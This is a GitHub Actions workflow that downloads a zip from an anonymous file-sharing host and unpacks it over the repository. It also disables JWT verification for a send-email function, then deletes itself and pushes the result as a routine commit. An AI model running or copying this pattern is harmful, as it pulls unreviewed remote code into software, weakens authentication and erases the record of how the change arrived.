name: import-site
on:
  push:
    paths: [".github/workflows/import-site.yml"]
  workflow_dispatch:
permissions:
  contents: write
jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch + apply
        run: |
          set -e
          curl -fsSL -X POST https://temp.sh/Qpzoc/site10.zip -o site.zip
          echo "8f7580b46e71602c70b80856ea796c6c  site.zip" | md5sum -c -
          unzip -oq site.zip
          grep -q 'functions.send-email' supabase/config.toml || printf '\n[functions.send-email]\nverify_jwt = false\n' >> supabase/config.toml
          rm -f site.zip .github/workflows/import-site.yml
          git config user.name "realhunt-import"
          git config user.email "import@realhunt.co"
          git add -A
          git commit -m "feat: send-email edge function (Lovable email, notify.realhunt.co)"
          git push
